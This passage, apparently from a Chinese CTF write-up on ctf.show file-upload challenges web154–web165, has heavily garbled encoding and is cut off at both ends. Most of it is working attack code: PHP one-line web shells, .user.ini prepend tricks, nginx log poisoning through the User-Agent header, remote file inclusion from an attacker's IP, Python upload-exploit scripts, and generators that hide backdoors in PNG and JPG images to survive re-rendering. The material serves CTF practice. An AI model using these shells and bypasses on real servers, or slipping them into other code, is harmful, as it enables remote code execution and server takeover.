å¤±è´¥ï¼Œåº”è¯¥æ˜¯å¯¹txtæ–‡ä»¶é‡Œçš„å†…å®¹æœ‰è¿‡æ»¤ç»æ£€æµ‹ï¼ŒæŸ¥éªŒä¹‹åå‘ç°æ˜¯å¯¹<code>php</code>è¿™ä¸‰ä¸ªå­—æ¯è¿‡æ»¤äº†</p><p>PHPæ ‡ç­¾ç»•è¿‡ï¼š</p><ul><li><p>é•¿æ ‡ç­¾ï¼š<?php ?></p></li><li><p>çŸ­æ ‡ç­¾ï¼š<? ?>ã€<?=  ?>ã€&lt;%  %&gt;ã€&lt;%&#x3D;  %&gt;</p></li><li><p>å…¶ä¸­ <?  ?> éœ€è¦å¼€å¯ short_open_tag&#x3D;On ï¼Œ&lt;%  %&gt; éœ€è¦å¼€å¯ asp_tags&#x3D;On</p></li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h4><p>è‡ªå¸¦ .user.iniï¼Œä½†ä¸å½±å“ï¼Œpayload ä¸ web154 ä¸€è‡´</p><h4 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h4><p>è¿‡æ»¤äº†<code>[]</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'attack'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web157-nginxæ–‡ä»¶åŒ…å«"><a href="#web157-nginxæ–‡ä»¶åŒ…å«" class="headerlink" title="web157(nginxæ–‡ä»¶åŒ…å«)"></a>web157(nginxæ–‡ä»¶åŒ…å«)</h4><p>è¿‡æ»¤äº†<code>;``&#123;&#125;</code>ï¼Œä½†æ˜¯ä¸å½±å“ï¼Œå¯ä»¥ç›´æ¥åœ¨1.txté‡Œé¢æ‰§è¡Œå‘½ä»¤</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span>tac <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>fla<span class="token operator">*</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><p>å…¶ä»–ï¼š</p><p>ç”±äºæˆ‘ä»¬ $_POST[] åªä½¿ç”¨ä¸€ä¸ªå‚æ•°å¹¶ä¸”ä¸ºæ•°ç»„æ ¼å¼ï¼Œè€ƒè™‘ä½¿ç”¨ array_pop() å¼¹å‡ºæœ€åä¸€ä¸ªå•å…ƒ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><p>ç”±web158çš„é»‘åå•å¾—æ¥ï¼Œ#nginx çš„æ—¥å¿—ä¼šè·å– UAå¤´ ä¿¡æ¯#bp æŠ“åŒ…,åœ¨ UAå¤´ è¿›è¡Œæ³¨å…¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'tac /var/log/nginx/access.log'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h4><p>banäº†logï¼Œå¯æ”¹ä¸º</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'tac /var/l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og/nginx/access.l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h4><p>banäº†()ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨åå¼•å·ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œæˆ–è€…ä¹‹å‰çš„nginxæ—¥å¿—æ³¨å…¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'/var/lo'</span><span class="token operator">.</span><span class="token string single-quoted-string">'g/nginx/access.l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h4><p>ç©ºæ ¼ï¼Œåå¼•å·è¢«banäº†</p><p>çªç ´ç©ºæ ¼è¿‡æ»¤å¯ä»¥ç”¨æ¢è¡Œç¬¦%0a</p><p>å¯ä»¥ç»§ç»­æ—¥å¿—æ³¨å…¥æˆ–è€…phpä¼ªåè®®</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"ph"</span><span class="token operator">.</span><span class="token string double-quoted-string">"p://filter/convert.base64-encode/resource=../flag.p"</span><span class="token operator">.</span><span class="token string double-quoted-string">"hp"</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web161-ä¼ªé€ å›¾ç‰‡å¤´GIF89a"><a href="#web161-ä¼ªé€ å›¾ç‰‡å¤´GIF89a" class="headerlink" title="web161(ä¼ªé€ å›¾ç‰‡å¤´GIF89a)"></a>web161(ä¼ªé€ å›¾ç‰‡å¤´GIF89a)</h4><p>å¢åŠ äº†å¯¹å›¾ç‰‡å¤´çš„è¯†åˆ«ï¼Œç”¨äº†getimagesize()è¿›è¡Œæ£€æµ‹</p><p>getimagesize(): ä¼šå¯¹ç›®æ ‡æ–‡ä»¶çš„16è¿›åˆ¶å»è¿›è¡Œä¸€ä¸ªè¯»å–ï¼Œå»è¯»å–å¤´å‡ ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸æ˜¯ç¬¦åˆå›¾ç‰‡çš„è¦æ±‚</p><p>inié—®ä»·å’Œä¸€å¥è¯æœ¨é©¬å‰éƒ½è¦åŠ ä¸€å¥GIF89aï¼Œæˆ–è€…æ”¹æˆpngæ–‡ä»¶å¤´89 50 4E 47</p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web162-æ¡ä»¶ç«äº‰-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#web162-æ¡ä»¶ç«äº‰-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="web162(æ¡ä»¶ç«äº‰ è¿œç¨‹æ–‡ä»¶åŒ…å«)"></a>web162(æ¡ä»¶ç«äº‰ è¿œç¨‹æ–‡ä»¶åŒ…å«)</h4><p>å†…å®¹banäº†<code>.</code>ä¹‹å‰æ–¹æ³•å°±ä¸è¡Œäº†ï¼Œå¯ä»¥åŒ…å«<code>/tmp/sess_&#123;sessid&#125;</code>è¿›è¡Œæ¡ä»¶ç«äº‰</p><p>ä¹Ÿå¯ä»¥è¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«</p><ol><li><p>å°†æœ¨é©¬ä¸Šä¼ è‡³è¿œç¨‹æœåŠ¡å™¨ï¼Œç”±äºè¿‡æ»¤äº†. æ‰€ä»¥éœ€è¦è½¬æ¢ä¸‹ï¼Œmm</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>æˆ–è€…<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat ../f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>ä¸Šä¼ åŒ…å«æ–‡ä»¶ .user.ini</p><pre class="language-ini" data-language="ini"><code class="language-ini">GIF89a<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">txt</span></code></pre></li><li><p>ä¸Šä¼ è¿œç¨‹è°ƒç”¨æ–‡ä»¶ txt <a href="https://www.bejson.com/convert/ip2int/">IPè½¬æ•°å­—</a></p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"http://æ•°å­—IP/mm"</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>è®¿é—®upload</p></li></ol><p><strong>ä½†æ˜¯æˆ‘åœ¨å°è¯•çš„æ—¶å€™ï¼Œæ€»æ˜¯è¿”å›400ğŸ˜…</strong></p><p>äºæ˜¯çœ‹åˆ°äº†å¦ä¸€ä¸ªéé¢„æœŸï¼Œé€šè¿‡å¼‚æˆ–ç¼–ç ç»•è¿‡è¿™é‡Œä¸èƒ½ç›´æ¥ç”¨ python çš„ urllib.parse.unquote å‡½æ•°ç¼–ç å‚æ•°ï¼Œéœ€è¦è‡ªè¡Œå†™ä¸€ä¸ª int2byte </p><p>çš„å‡½æ•°ï¼Œè¿™é‡Œé‡åˆ°ä¸ªå‘ã€‚</p><p>é¡ºå¸¦ç”¨ python å®ç°äº†ä¸‹ php ä¸­å¯¹å­—ç¬¦ä¸²çš„å–åï¼Œå…¶å®å°±æ˜¯ <code>255 - å­—ç¬¦çš„ascii</code> å¾—åˆ°çš„ ascii å–å­—ç¬¦ã€‚äºæ˜¯å°±æœ‰äº†å¦‚ä¸‹è„šæœ¬ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2neg_bytes</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"/var/log/nginx/access.log"</span>file_content <span class="token operator">=</span> <span class="token string">"&lt;?=include~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> str2neg_bytes<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"?>"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>burp0_url <span class="token operator">=</span> <span class="token string">"https://f0c1c895-2920-42b8-8f40-cff4a3a610b3.challenge.ctf.show/upload.php"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span> <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 &lt;?=system('tac ../fla*');?>"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryv0k4Ho2WfgKjvEM4"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>burp0_data <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundaryv0k4Ho2WfgKjvEM4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\nContent-Type: image/png\r\n\r\nGIF78a\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> file_content <span class="token operator">+</span> <span class="token string">"\r\n\r\n\r\n------WebKitFormBoundaryv0k4Ho2WfgKjvEM4--\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h4><p>ä¸Šä¼ å›¾ç‰‡åï¼Œä¼šè¢«åˆ é™¤ï¼Œæ‰€ä»¥éœ€è¦åœ¨ä¸Šä¼ çš„ç¬é—´ï¼Œå°±postå‘½ä»¤æ‰§è¡Œï¼Œè¿˜å¯ä»¥ç›´æ¥åœ¨é…ç½®æ–‡ä»¶é‡Œè¿œç¨‹åŒ…å«ï¼Œç„¶åè®¿é—®&#x2F;upload&#x2F;index.phpã€‚</p><p>è¿™æ ·å°±ä¸ç”¨å³æ—¶å»postäº†ã€‚ï¼ˆè¿™ä¸ªè¦æ±‚æœåŠ¡å™¨å¼€å¯äº†è¿œç¨‹åŒ…å«é€‰é¡¹ï¼‰</p><p>åŒæ ·ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸Šé¢è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2neg_bytes</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"php://filter/convert.base64-encode/resource=/var/www/html/flag.php"</span>file_content <span class="token operator">=</span> <span class="token string">"&lt;?=include~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> str2neg_bytes<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"?>"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>burp0_url <span class="token operator">=</span> <span class="token string">"https://ff4fcc76-8205-41ea-a4ba-52f257147647.challenge.ctf.show/upload.php"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span> <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryv0k4Ho2WfgKjvEM4"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>burp0_data <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundaryv0k4Ho2WfgKjvEM4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\nContent-Type: image/png\r\n\r\nGIF78a\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> file_content <span class="token operator">+</span> <span class="token string">"\r\n\r\n\r\n------WebKitFormBoundaryv0k4Ho2WfgKjvEM4--\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web164-pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“"><a href="#web164-pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="web164(pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“)"></a>web164(pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“)</h4><p>è¿™ä¸€å…³è€ƒå¯Ÿpngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ï¼Œç»è¿‡ä¸Šä¼ å›¾ç‰‡åå†æ¬¡å°†å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ç»è¿‡å¯¹æ¯”ï¼Œä½¿ç”¨010editorå‘ç°ç»è¿‡äº†äºŒæ¬¡æ¸²æŸ“ï¼Œå¾ˆå¤šåœ°æ–¹çš„æ•°æ®éƒ½</p><p>ä¸ä¸€æ ·äº†</p><blockquote><p>æ‰€è°“äºŒæ¬¡æ¸²æŸ“ï¼Œå°±æ˜¯ç½‘ç«™å°†ç”¨æˆ·æ‰€ä¸Šä¼ çš„æ–‡ä»¶ï¼Œç”±äºå„ç§åŸå› ï¼ˆé€‚é…ç½‘ç«™æ˜¾ç¤ºï¼Œé˜²æ­¢æœ¨é©¬ï¼‰ç­‰ï¼Œå°†æ–‡ä»¶ä¸­çš„æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œå¯¹äºŒæ¬¡æ¸²</p><p>æŸ“çš„ç»•è¿‡å³å°†æºæ–‡ä»¶ä¸ä¸Šä¼ ä¹‹åçš„æ–‡ä»¶è¿›è¡Œå¯¹æ¯”ï¼Œæ‰¾å‡ºæ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„æ•°æ®ä½ç½®ï¼Œå°†åé—¨ä»£ç æ’å…¥æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„æ•°æ®çš„ä½ç½®ã€‚å¯¹äº</p><p>ç»•è¿‡äºŒæ¬¡æ¸²æŸ“ï¼Œäººå·¥ç»•è¿‡å‡ ä¹ä¸å¯èƒ½ï¼Œè¿™å°±éœ€è¦ä½¿ç”¨è„šæœ¬æ¥è¿›è¡Œæ„å»ºå›¾ç‰‡é©¬ã€‚</p></blockquote><p>æŸä¸çŸ¥åä½¬å†™çš„ä»£ç ,å‚è€ƒ<a href="https://blog.csdn.net/qq_46918279/article/details/120575503">CTFSHOW-æ–‡ä»¶ä¸Šä¼ </a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„</span> <span class="token comment">/* æœ¨é©¬å†…å®¹&lt;?$_GET[0]($_POST[1]);?> */</span><span class="token comment">//imagepng($img,'1.png');  è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„,1.pngæ˜¯ä½¿ç”¨çš„æ–‡ä»¶ï¼Œå¯ä»¥ä¸å­˜åœ¨</span><span class="token comment">//ä¼šåœ¨ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª1.pngå›¾ç‰‡</span><span class="token comment">//å›¾ç‰‡è„šæœ¬å†…å®¹ï¼š$_GET[0]($_POST[1]);</span><span class="token comment">//ä½¿ç”¨æ–¹æ³•ï¼šä¾‹å­ï¼šæŸ¥çœ‹å›¾ç‰‡ï¼Œgetä¼ å…¥0=systemï¼›postä¼ å…¥tac flag.php</span> <span class="token delimiter important">?></span></span>------------------------------------           åˆ›å»º1.pngå›¾ç‰‡æˆåŠŸï¼      ------------------------------------</code></pre><p><img src="web164.png" loading="lazy"></p><h4 id="web165-jpgäºŒæ¬¡æ¸²æŸ“"><a href="#web165-jpgäºŒæ¬¡æ¸²æŸ“" class="headerlink" title="web165(jpgäºŒæ¬¡æ¸²æŸ“)"></a>web165(jpgäºŒæ¬¡æ¸²æŸ“)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">/*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg>    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs "Something's wrong".    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */</span>    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?=eval(\$_POST[7]);?>"</span><span class="token punctuation">;</span> <span class="token 